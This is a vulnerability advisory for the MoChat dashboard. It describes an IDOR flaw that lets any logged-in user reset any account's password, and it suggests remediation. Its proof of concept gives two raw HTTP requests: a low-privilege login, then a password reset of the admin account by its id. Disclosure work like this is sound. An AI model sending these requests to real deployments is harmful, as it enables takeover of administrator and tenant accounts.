# MoChat — 任意用户密码重置 IDOR（PUT /dashboard/user/passwordReset） (MC-VULN-001)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Improper Authorization |
| **CWE** | CWE-639 / CWE-862 |
| **Authentication** | Any authenticated dashboard user (no RBAC) |

## Summary

Any logged-in user can reset any account password by supplying arbitrary `id` in `PUT /dashboard/user/passwordReset`. Handler validates only the current user exists, not that `id` matches the caller or belongs to the same tenant.

## Root cause

`PasswordReset.php` loads `$user['id']` for validation but calls `updateUserPasswordById((int) $userId, ...)` with request `id`.

## Proof of Concept

```
# Step 1 — login as low-privilege user (13900139001)
POST /dashboard/user/auth HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: application/json
Connection: close

{"phone":"13900139001","password":"admin123456"}

# Step 2 — reset admin (id=1) password (replace TOKEN)
PUT /dashboard/user/passwordReset HTTP/1.1
Host: 127.0.0.1:9501
Authorization: Bearer TOKEN
Content-Type: application/json
Connection: close

{"id":1,"newPassword":"idorPoc999"}
```

**Expected:** HTTP 200; then `POST /dashboard/user/auth` with admin phone + new password succeeds

## Impact

Full account takeover of super-admin and all tenants' users.

## Remediation

Enforce `id` belongs to caller tenant; require PermissionMiddleware; only super-admin may reset others.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-001
- PoC: `POC_VERIFICATION_REPORT.md`
